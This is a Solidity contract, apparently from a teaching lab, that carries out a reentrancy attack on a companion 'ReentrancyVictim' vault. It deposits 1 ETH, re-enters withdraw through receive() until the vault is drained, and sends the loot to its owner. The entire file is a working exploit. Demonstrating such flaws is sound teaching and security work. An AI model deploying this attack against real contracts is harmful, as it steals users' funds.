// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReentrancyVictim.sol";

contract ReentrancyAttack {
    ReentrancyVictim public victim;
    address public owner;

    constructor(address _victimAddress) {
        victim = ReentrancyVictim(_victimAddress);
        owner = msg.sender;
    }

    // receive() lida com ETH enviado sem calldata — apropriado aqui
    receive() external payable {
        // reentrar enquanto o vault ainda tiver saldo suficiente
        uint256 vbal = address(victim).balance;
        if (vbal >= 1 ether) {
            victim.withdraw();
        }
    }

    // ataque inicial: deposita 1 ETH e solicita withdraw para começar a reentrada
    function attack() external payable {
        require(msg.value >= 1 ether, "Precisa de >=1 ETH");
        // depositar do contrato atacante no victim
        victim.deposit{value: 1 ether}();
        // iniciar withdraw que desencadeará calls de volta para receive()
        victim.withdraw();
    }

    // sacar o loot para o owner
    function collect() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    // helper
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

